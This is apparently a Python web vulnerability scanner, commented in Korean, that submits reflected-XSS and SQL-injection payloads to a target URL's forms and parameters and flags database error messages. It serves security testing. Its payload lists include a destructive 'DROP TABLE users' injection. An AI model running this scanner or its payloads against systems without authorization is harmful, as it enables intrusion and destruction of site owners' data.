#!/usr/bin/env python3

import requests
import urllib.parse
from bs4 import BeautifulSoup
import re
import time
import sys
from urllib.parse import urljoin, urlparse
import argparse

class WebSecurityScanner:
    def __init__(self, target_url, delay=1):
        self.target_url = target_url
        self.delay = delay  # 요청 간 지연 시간 (초)
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # XSS 테스트 페이로드
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "'\"><script>alert('XSS')</script>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input type=image src=x onerror=alert('XSS')>",
        ]
        
        # SQL Injection 테스트 페이로드
        self.sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "' UNION SELECT NULL--",
            "' AND (SELECT COUNT(*) FROM sysobjects)>0--",
            "1' OR '1'='1",
            "admin'--",
            "' OR 'x'='x",
            "1; DROP TABLE users--",
            "' OR 1=1 LIMIT 1--",
        ]

    def get_forms(self, url):
        """페이지에서 모든 폼을 추출합니다."""
        try:
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.content, 'html.parser')
            return soup.find_all('form')
        except Exception as e:
            print(f"[ERROR] 폼 추출 실패 ({url}): {e}")
            return []

    def get_form_details(self, form):
        """폼의 세부사항을 추출합니다."""
        details = {}
        action = form.attrs.get('action', '').lower()
        method = form.attrs.get('method', 'get').lower()
        inputs = []
        
        for input_tag in form.find_all('input'):
            input_type = input_tag.attrs.get('type', 'text')
            input_name = input_tag.attrs.get('name')
            inputs.append({'type': input_type, 'name': input_name})
            
        details['action'] = action
        details['method'] = method
        details['inputs'] = inputs
        return details

    def test_xss_in_form(self, form, url):
        """폼에서 XSS 취약점을 테스트합니다."""
        form_details = self.get_form_details(form)
        target_url = urljoin(url, form_details['action'])
        
        vulnerabilities = []
        
        for payload in self.xss_payloads:
            data = {}
            for input_tag in form_details['inputs']:
                if input_tag['type'] == 'text' or input_tag['type'] == 'search':
                    data[input_tag['name']] = payload
                elif input_tag['type'] == 'email':
                    data[input_tag['name']] = 'test@example.com'
                else:
                    data[input_tag['name']] = 'test'
            
            try:
                if form_details['method'] == 'post':
                    response = self.session.post(target_url, data=data, timeout=10)
                else:
                    response = self.session.get(target_url, params=data, timeout=10)
                
                # 페이로드가 응답에 반영되는지 확인
                if payload in response.text:
                    vulnerabilities.append({
                        'type': 'XSS (Reflected)',
                        'url': target_url,
                        'payload': payload,
                        'method': form_details['method'].upper(),
                        'parameter': str(data)
                    })
                    print(f"[XSS FOUND] {target_url}")
                    print(f"  Payload: {payload}")
                    print(f"  Method: {form_details['method'].upper()}")
                    
                time.sleep(self.delay)
                
            except Exception as e:
                print(f"[ERROR] XSS 테스트 실패: {e}")
        
        return vulnerabilities

    def test_sql_injection_in_form(self, form, url):
        """폼에서 SQL Injection 취약점을 테스트합니다."""
        form_details = self.get_form_details(form)
        target_url = urljoin(url, form_details['action'])
        
        vulnerabilities = []
        
        for payload in self.sql_payloads:
            data = {}
            for input_tag in form_details['inputs']:
                if input_tag['type'] in ['text', 'password', 'email']:
                    data[input_tag['name']] = payload
                else:
                    data[input_tag['name']] = 'test'
            
            try:
                if form_details['method'] == 'post':
                    response = self.session.post(target_url, data=data, timeout=10)
                else:
                    response = self.session.get(target_url, params=data, timeout=10)
                
                # SQL 오류 메시지 패턴 확인
                sql_errors = [
                    "mysql_fetch_array()",
                    "ORA-01756",
                    "Microsoft OLE DB Provider for ODBC Drivers",
                    "java.sql.SQLException",
                    "PostgreSQL query failed",
                    "Warning: mysql_",
                    "MySQLSyntaxErrorException",
                    "valid MySQL result",
                    "check the manual that corresponds to your MySQL",
                    "ORA-00933",
                    "SQL syntax.*MySQL",
                    "Warning.*\Wmysql_.*",
                    "valid MySQL result",
                    "MySqlClient\.",
                ]
                
                for error in sql_errors:
                    if re.search(error, response.text, re.IGNORECASE):
                        vulnerabilities.append({
                            'type': 'SQL Injection',
                            'url': target_url,
                            'payload': payload,
                            'method': form_details['method'].upper(),
                            'error': error,
                            'parameter': str(data)
                        })
                        print(f"[SQL INJECTION FOUND] {target_url}")
                        print(f"  Payload: {payload}")
                        print(f"  Error Pattern: {error}")
                        print(f"  Method: {form_details['method'].upper()}")
                        break
                
                time.sleep(self.delay)
                
            except Exception as e:
                print(f"[ERROR] SQL Injection 테스트 실패: {e}")
        
        return vulnerabilities

    def test_url_parameters(self, url):
        """URL 파라미터에서 취약점을 테스트합니다."""
        vulnerabilities = []
        parsed_url = urlparse(url)
        
        if parsed_url.query:
            params = urllib.parse.parse_qs(parsed_url.query)
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
            
            # XSS 테스트
            for payload in self.xss_payloads[:3]:  # 처음 3개만 테스트
                test_params = {}
                for param in params:
                    test_params[param] = payload
                
                try:
                    response = self.session.get(base_url, params=test_params, timeout=10)
                    if payload in response.text:
                        vulnerabilities.append({
                            'type': 'XSS (URL Parameter)',
                            'url': response.url,
                            'payload': payload,
                            'parameter': str(test_params)
                        })
                        print(f"[XSS FOUND in URL] {response.url}")
                    
                    time.sleep(self.delay)
                except Exception as e:
                    print(f"[ERROR] URL 파라미터 XSS 테스트 실패: {e}")
            
            # SQL Injection 테스트
            for payload in self.sql_payloads[:3]:  # 처음 3개만 테스트
                test_params = {}
                for param in params:
                    test_params[param] = payload
                
                try:
                    response = self.session.get(base_url, params=test_params, timeout=10)
                    
                    sql_errors = ["mysql_fetch_array()", "Warning: mysql_", "SQL syntax"]
                    for error in sql_errors:
                        if error in response.text:
                            vulnerabilities.append({
                                'type': 'SQL Injection (URL Parameter)',
                                'url': response.url,
                                'payload': payload,
                                'error': error,
                                'parameter': str(test_params)
                            })
                            print(f"[SQL INJECTION FOUND in URL] {response.url}")
                            break
                    
                    time.sleep(self.delay)
                except Exception as e:
                    print(f"[ERROR] URL 파라미터 SQL Injection 테스트 실패: {e}")
        
        return vulnerabilities

    def scan(self):
        """메인 스캔 함수입니다."""
        print(f"[INFO] 스캔 시작: {self.target_url}")
        print(f"[INFO] 요청 간 지연: {self.delay}초")
        print("="*60)
        
        all_vulnerabilities = []
        
        # URL 파라미터 테스트
        url_vulns = self.test_url_parameters(self.target_url)
        all_vulnerabilities.extend(url_vulns)
        
        # 폼 기반 테스트
        forms = self.get_forms(self.target_url)
        print(f"[INFO] 발견된 폼 수: {len(forms)}")
        
        for i, form in enumerate(forms):
            print(f"[INFO] 폼 {i+1} 테스트 중...")
            
            # XSS 테스트
            xss_vulns = self.test_xss_in_form(form, self.target_url)
            all_vulnerabilities.extend(xss_vulns)
            
            # SQL Injection 테스트
            sql_vulns = self.test_sql_injection_in_form(form, self.target_url)
            all_vulnerabilities.extend(sql_vulns)
        
        # 결과 요약
        print("\n" + "="*60)
        print("스캔 결과 요약:")
        print("="*60)
        
        if all_vulnerabilities:
            print(f"총 {len(all_vulnerabilities)}개의 취약점이 발견되었습니다:")
            
            xss_count = len([v for v in all_vulnerabilities if 'XSS' in v['type']])
            sql_count = len([v for v in all_vulnerabilities if 'SQL' in v['type']])
            
            print(f"- XSS 취약점: {xss_count}개")
            print(f"- SQL Injection 취약점: {sql_count}개")
            
            print("\n상세 결과:")
            for i, vuln in enumerate(all_vulnerabilities, 1):
                print(f"\n[{i}] {vuln['type']}")
                print(f"    URL: {vuln['url']}")
                print(f"    Payload: {vuln['payload']}")
                if 'method' in vuln:
                    print(f"    Method: {vuln['method']}")
                if 'error' in vuln:
                    print(f"    Error Pattern: {vuln['error']}")
        else:
            print("취약점이 발견되지 않았습니다.")
        
        return all_vulnerabilities

def main():
    parser = argparse.ArgumentParser(description='웹 보안 취약점 스캐너')
    parser.add_argument('url', help='스캔할 URL')
    parser.add_argument('--delay', type=float, default=1.0, 
                       help='요청 간 지연 시간 (초, 기본값: 1.0)')
    
    args = parser.parse_args()
    
    # URL 검증
    if not args.url.startswith(('http://', 'https://')):
        print("[ERROR] URL은 http:// 또는 https://로 시작해야 합니다.")
        sys.exit(1)
    
    print("="*60)
    print("웹 보안 취약점 스캐너 v1.0")
    print("XSS 및 SQL Injection 탐지")
    print("교육 목적으로만 사용하세요!")
    print("="*60)
    
    scanner = WebSecurityScanner(args.url, args.delay)
    
    try:
        vulnerabilities = scanner.scan()
        
        if vulnerabilities:
            print(f"\n[WARNING] {len(vulnerabilities)}개의 보안 취약점이 발견되었습니다!")
            print("이 취약점들을 즉시 수정하세요.")
        
    except KeyboardInterrupt:
        print("\n[INFO] 사용자에 의해 스캔이 중단되었습니다.")
    except Exception as e:
        print(f"[ERROR] 스캔 중 오류 발생: {e}")

if __name__ == "__main__":
    main()
